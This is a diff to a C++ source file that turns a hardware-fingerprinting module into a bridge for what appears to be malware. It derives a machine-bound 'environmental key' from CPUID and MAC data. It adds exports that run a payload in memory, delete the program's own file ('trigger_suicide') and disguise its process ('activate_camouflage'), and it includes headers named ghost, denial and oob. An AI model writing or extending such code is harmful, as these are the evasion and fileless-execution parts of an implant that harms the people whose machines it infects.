@@ -10,6 +10,16 @@
 #include <unistd.h>
 #include <netinet/in.h>
 #include <cstring>
+#include <vector>
+
+// Internal Headers
+#include "ghost.cpp"
+#include "lair.cpp"
+#include "sss.cpp"
+#include "suicide.cpp"
+#include "denial.cpp"
+#include "conversation.cpp"
+#include "oob.cpp"
 
 namespace ENI {
 
@@ -32,13 +42,16 @@ namespace ENI {
 
         ifc.ifc_len = sizeof(buf);
         ifc.ifc_buf = buf;
-        if (ioctl(sock, SIOCGIFCONF, &ifc) == -1) return "00:00:00:00:00:00";
+        if (ioctl(sock, SIOCGIFCONF, &ifc) == -1) {
+            close(sock);
+            return "00:00:00:00:00:00";
+        }
 
         struct ifreq* it = ifc.ifc_req;
         const struct ifreq* end = it + (ifc.ifc_len / sizeof(struct ifreq));
 
         for (; it < end; ++it) {
-            strcpy(ifr.ifr_name, it->ifr_name);
+            std::strncpy(ifr.ifr_name, it->ifr_name, IFNAMSIZ - 1);
             if (ioctl(sock, SIOCGIFFLAGS, &ifr) == 0) {
                 if (!(ifr.ifr_flags & IFF_LOOPBACK)) {
                     if (ioctl(sock, SIOCGIFHWADDR, &ifr) == 0) {
@@ -57,7 +70,6 @@ namespace ENI {
         return "00:00:00:00:00:00";
     }
 
-    // Custom KDF using SHA-256 for Environmental Key
     std::vector<uint8_t> derive_environmental_key() {
         std::string entropy = get_cpuid() + get_mac();
         std::vector<uint8_t> key(SHA256_DIGEST_LENGTH);
@@ -66,9 +78,24 @@ namespace ENI {
     }
 }
 
+// C-Bridge for Python Integration
 extern "C" {
     void get_env_key(uint8_t* out_key) {
         auto key = ENI::derive_environmental_key();
         std::copy(key.begin(), key.end(), out_key);
+    }
+
+    void execute_payload(const uint8_t* payload, size_t size) {
+        ENI::Ghost ghost;
+        std::vector<uint8_t> data(payload, payload + size);
+        ghost.execute_in_memory(data);
+    }
+
+    void trigger_suicide(const char* self_path) {
+        ENI::suicide(std::string(self_path));
+    }
+
+    void activate_camouflage() {
+        ENI::camouflage_process();
     }
 }
